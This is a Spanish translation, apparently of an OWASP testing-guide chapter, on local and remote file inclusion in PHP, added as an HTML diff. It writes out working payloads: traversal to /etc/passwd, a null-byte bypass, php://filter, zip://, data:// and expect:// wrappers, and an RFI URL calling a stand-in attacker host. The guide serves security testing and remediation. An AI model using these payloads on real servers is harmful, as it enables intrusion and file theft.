@@ -1,0 +1,93 @@
+<h1 id="file-inclusion">Inclusión de archivos</h1>
+<h2 id="summary">Resumen</h2>
+<p>La vulnerabilidad de inclusión de archivos (File Inclusion) permite a un atacante incluir un archivo, generalmente explotando un mecanismo de &quot;inclusión dinámica de archivos&quot; implementado en la aplicación objetivo. La vulnerabilidad se produce por el uso de entradas suministradas por el usuario sin la debida validación.</p>
+<p>Esto puede conducir a algo tan simple como mostrar el contenido del archivo, pero también puede derivar en:</p>
+<ul>
+<li>Ejecución de código en el servidor web</li>
+<li>Ejecución de código del lado del cliente, como JavaScript, lo que puede conducir a otros ataques como Cross-Site Scripting (XSS)</li>
+<li>Denegación de servicio (DoS)</li>
+<li>Divulgación de información sensible</li>
+</ul>
+<p>La inclusión de archivos locales (Local File Inclusion, LFI) es el proceso de incluir archivos que ya están presentes en el servidor mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe una entrada que es la ruta a un archivo local. Esta entrada no se sanea adecuadamente, lo que permite inyectar caracteres de recorrido de directorios (como <code>../</code> -- véase 4.5.1 <a href="#/4-Web_Application_Security_Testing/05-Authorization/01-Directory_Traversal_File_Include">Testing Directory Traversal File Include</a>).</p>
+<p>La inclusión de archivos remotos (Remote File Inclusion, RFI) es el proceso de incluir archivos desde fuentes remotas mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe una entrada que es la URL de un archivo remoto. Esta entrada no se sanea adecuadamente, lo que permite inyectar URL externas.</p>
+<p>En ambos casos, aunque la mayoría de los ejemplos apuntan a scripts PHP vulnerables, debemos tener en cuenta que también es común en otras tecnologías como JSP, ASP, etc.</p>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar los puntos de inclusión de archivos.</li>
+<li>Evaluar la severidad o el impacto potencial de las vulnerabilidades.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<h3 id="local-file-inclusion">Inclusión de archivos locales</h3>
+<p>Dado que LFI ocurre cuando las rutas pasadas a las sentencias <code>include</code> no se sanean adecuadamente, en un enfoque de pruebas de caja negra se debe buscar funcionalidad que acepte nombres/rutas de archivos como parámetros.</p>
+<p>Considérese el siguiente ejemplo:</p>
+<p><code>https://vulnerable_host/preview.php?file=example.html</code></p>
+<p>Parece un lugar prometedor para probar LFI. Si la aplicación no selecciona la página apropiada indicada en el parámetro <code>file</code> y en cambio incluye directamente la entrada, es posible incluir archivos arbitrarios del servidor.</p>
+<p>Una prueba de concepto típica consiste en intentar cargar el archivo <code>passwd</code> con:</p>
+<p><code>https://vulnerable_host/preview.php?file=../../../../etc/passwd</code></p>
+<p>Si se cumplen las condiciones mencionadas, un atacante vería algo como lo siguiente incluido en la respuesta:</p>
+<pre><code class="language-bash">root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+alex:x:500:500:alex:/home/alex:/bin/bash
+margo:x:501:501::/home/margo:/bin/bash
+...
+</code></pre>
+<p>Incluso cuando existe una vulnerabilidad así, su explotación podría ser más compleja en escenarios del mundo real. Considérese el siguiente fragmento de código:</p>
+<pre><code class="language-php">&lt;?php include($_GET[&#39;file&#39;].&quot;.php&quot;); ?&gt;
+</code></pre>
+<p>Una simple sustitución por un nombre de archivo aleatorio no funcionaría, ya que el sufijo <code>.php</code> se añade a la entrada proporcionada. Para eludirlo, un evaluador puede utilizar varias técnicas para lograr la explotación esperada.</p>
+<h4 id="null-byte-injection">Inyección de byte nulo</h4>
+<p>El <code>carácter nulo</code> (también conocido como <code>terminador nulo</code> o <code>byte nulo</code>) es un carácter de control con valor cero presente en muchos conjuntos de caracteres que se utiliza como carácter reservado para marcar el final de una cadena. Una vez utilizado, cualquier carácter posterior a este byte especial será ignorado. Comúnmente, la forma de inyectar este carácter sería con la cadena codificada en URL <code>%00</code>, añadiéndola a la ruta solicitada. En nuestro ejemplo anterior, realizar una petición a <code>https://vulnerable_host/preview.php?file=../../../../etc/passwd%00</code> haría que se ignorara la extensión <code>.php</code> que se añade al nombre de archivo de entrada, devolviendo al atacante una lista de usuarios básicos como resultado de una explotación exitosa.</p>
+<h4 id="path-and-dot-truncation">Truncamiento de ruta y de puntos</h4>
+<p>La mayoría de las instalaciones de PHP tienen un límite de nombre de archivo de 4096 bytes. Si un nombre de archivo es más largo que esa longitud, PHP simplemente lo trunca, descartando los caracteres adicionales. Abusar de este comportamiento permite hacer que el motor de PHP ignore la extensión <code>.php</code> al desplazarla fuera del límite de 4096 bytes. Cuando esto sucede, no se genera ningún error; los caracteres adicionales simplemente se descartan y PHP continúa su ejecución normalmente.</p>
+<p>Esta elusión se combinaría comúnmente con otras estrategias de elusión de la lógica, como codificar parte de la ruta del archivo con codificación Unicode, introducir doble codificación o cualquier otra entrada que siga representando el nombre de archivo válido deseado.</p>
+<h4 id="php-wrappers">Wrappers de PHP</h4>
+<p>Las vulnerabilidades de inclusión de archivos locales suelen verse como vulnerabilidades de solo lectura que un atacante puede usar para leer datos sensibles del servidor que aloja la aplicación vulnerable. Sin embargo, en algunas implementaciones específicas esta vulnerabilidad puede usarse para escalar el ataque <a href="https://corben.io/blog/17-01-01-zip-to-rce-lfi" target="_blank" rel="noopener">de LFI a vulnerabilidades de ejecución remota de código</a> que podrían comprometer por completo el host.</p>
+<p>Esta escalada es común cuando un atacante puede combinar la <a href="https://www.invicti.com/blog/web-security/php-stream-wrappers" target="_blank" rel="noopener">vulnerabilidad LFI con ciertos wrappers de PHP</a>.</p>
+<p>Un wrapper es un código que envuelve a otro código para realizar alguna funcionalidad adicional. PHP implementa muchos <a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener">wrappers integrados</a> para usarse con funciones del sistema de archivos. Una vez que se detecta su uso durante el proceso de pruebas de una aplicación, es una buena práctica intentar abusar de ellos para identificar el riesgo real de las debilidades detectadas. A continuación se presenta una lista con los wrappers más comúnmente utilizados, aunque se debe tener en cuenta que no es exhaustiva y que, al mismo tiempo, es posible registrar wrappers personalizados que, si el objetivo los emplea, requerirían un análisis ad hoc más profundo.</p>
+<h5 id="php-filter">PHP Filter</h5>
+<p>Se utiliza para acceder al sistema de archivos local; es un wrapper que no distingue entre mayúsculas y minúsculas y que ofrece la capacidad de aplicar filtros a un flujo (stream) en el momento de abrir un archivo. Este wrapper puede usarse para obtener el contenido de un archivo evitando que el servidor lo ejecute. Por ejemplo, permite a un atacante leer el contenido de archivos PHP para obtener el código fuente e identificar información sensible, como credenciales u otras vulnerabilidades explotables.</p>
+<p>El wrapper puede usarse como <code>php://filter/convert.base64-encode/resource=FILE</code>, donde <code>FILE</code> es el archivo que se desea recuperar. Como resultado de esta ejecución, el contenido del archivo objetivo se leería, se codificaría en base64 (este es el paso que evita la ejecución del lado del servidor) y se devolvería al User-Agent.</p>
+<h5 id="php-zip">PHP ZIP</h5>
+<p>En PHP 7.2.0 se introdujo el wrapper <code>zip://</code> para manipular archivos comprimidos <code>zip</code>. Este wrapper espera la siguiente estructura de parámetros: <code>zip:///filename_path#internal_filename</code>. El <code>filename_path</code> es la ruta al archivo ZIP malicioso y <code>internal_filename</code> es la ruta del archivo malicioso ubicado dentro del archivo ZIP procesado. Durante la explotación, es común que el <code>#</code> se codifique con su valor codificado en URL <code>%23</code>.</p>
+<p>El abuso de este wrapper podría permitir a un atacante diseñar un archivo ZIP malicioso que pueda subirse al servidor, por ejemplo como imagen de avatar o usando cualquier sistema de carga de archivos disponible en el sitio objetivo (el wrapper <code>php:zip://</code> no requiere que el archivo ZIP tenga una extensión específica), para ser ejecutado mediante la vulnerabilidad LFI.</p>
+<p>Para probar esta vulnerabilidad, se podría seguir el siguiente procedimiento para atacar el ejemplo de código anterior.</p>
+<ol>
+<li>Crear el archivo PHP que se ejecutará, por ejemplo con el contenido <code>&lt;?php phpinfo(); ?&gt;</code>, y guardarlo como <code>code.php</code>.</li>
+<li>Comprimirlo en un nuevo archivo ZIP llamado <code>target.zip</code>.</li>
+<li>Renombrar el archivo <code>target.zip</code> a <code>target.jpg</code> para eludir la validación de extensión y subirlo al sitio web objetivo como imagen de avatar.</li>
+<li>Suponiendo que el archivo <code>target.jpg</code> se almacena localmente en el servidor en la ruta <code>../avatar/target.jpg</code>, explotar la vulnerabilidad con el wrapper PHP ZIP inyectando el siguiente payload en la URL vulnerable: <code>zip://../avatar/target.jpg%23code</code> (recuerde que <code>%23</code> corresponde a <code>#</code>).</li>
+</ol>
+<p>Dado que en nuestro ejemplo la extensión <code>.php</code> se concatena a nuestro payload, la petición a <code>https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code</code> resultará en la ejecución del archivo <code>code.php</code> existente dentro del archivo ZIP malicioso.</p>
+<h5 id="php-data">PHP Data</h5>
+<p>Disponible desde PHP 5.2.0, este wrapper espera el siguiente uso: <code>data://text/plain;base64,BASE64_STR</code>, donde se espera que <code>BASE64_STR</code> sea el contenido codificado en base64 del archivo a procesar. Es importante considerar que este wrapper solo estaría disponible si la opción <code>allow_url_include</code> está habilitada.</p>
+<p>Para probar LFI usando este wrapper, el código a ejecutar debe estar codificado en base64. Por ejemplo, <code>&lt;?php phpinfo(); ?&gt;</code> se codificaría como: <code>PD9waHAgcGhwaW5mbygpOyA/Pg==</code> y el payload se representaría como: <code>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</code>.</p>
+<h5 id="php-expect">PHP Expect</h5>
+<p>Este wrapper, que no está habilitado por defecto, proporciona acceso a los procesos <code>stdio</code>, <code>stdout</code> y <code>stderr</code>. Dado en el formato <code>expect://command</code>, el servidor ejecutaría el comando proporcionado usando <code>BASH</code> y devolvería el resultado.</p>
+<h3 id="remote-file-inclusion">Inclusión de archivos remotos</h3>
+<p>Dado que RFI ocurre cuando las URL pasadas a las sentencias <code>include</code> no se sanean adecuadamente, en un enfoque de pruebas de caja negra se debe buscar scripts que tomen nombres de archivo como parámetros. Considérese el siguiente ejemplo en PHP:</p>
+<pre><code class="language-php">$incfile = $_REQUEST[&quot;file&quot;];
+include($incfile.&quot;.php&quot;);
+</code></pre>
+<p>En este ejemplo la ruta se extrae de la petición HTTP y no se realiza ninguna validación de entrada (por ejemplo, comparando la entrada con una lista de permitidos), por lo que este fragmento de código es vulnerable a este tipo de ataque. Considérese la siguiente URL:</p>
+<p><code>https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page</code></p>
+<p>En este caso el archivo remoto se va a incluir y cualquier código que contenga será ejecutado por el servidor.</p>
+<h2 id="remediation">Corrección</h2>
+<p>La solución más efectiva para eliminar las vulnerabilidades de inclusión de archivos es evitar pasar entradas enviadas por el usuario a cualquier API del sistema de archivos o del framework. Si esto no es posible, la aplicación puede mantener una lista de permitidos con los archivos que la página puede incluir y luego usar un identificador (por ejemplo, el número de índice) para acceder al archivo seleccionado. Cualquier petición que contenga un identificador no válido debe rechazarse para que los usuarios maliciosos no tengan oportunidad de manipular la ruta.
+Consulte la <a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank" rel="noopener">File Upload Cheat Sheet</a> para conocer buenas prácticas de seguridad sobre este tema.</p>
+<h2 id="tools">Herramientas</h2>
+<ul>
+<li><a href="https://github.com/P0cL4bs/Kadimus" target="_blank" rel="noopener">kadimus</a></li>
+<li><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">LFI Suite</a></li>
+<li><a href="https://www.zaproxy.org" target="_blank" rel="noopener">Zed Attack Proxy (ZAP)</a></li>
+</ul>
+<h2 id="references">Referencias</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability" target="_blank" rel="noopener">Wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Null_character" target="_blank" rel="noopener">Null character</a></li>
+<li><a href="https://owasp.org/www-community/attacks/Unicode_Encoding" target="_blank" rel="noopener">Unicode Encoding</a></li>
+<li><a href="https://owasp.org/www-community/Double_Encoding" target="_blank" rel="noopener">Double Encoding</a></li>
+<li><a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="noopener">PHP Supported Protocols and Wrappers</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc2397" target="_blank" rel="noopener">RFC 2397 - The &quot;data&quot; URL scheme</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank" rel="noopener">Wikipedia: &quot;Remote File Inclusion&quot;</a></li>
+</ul>
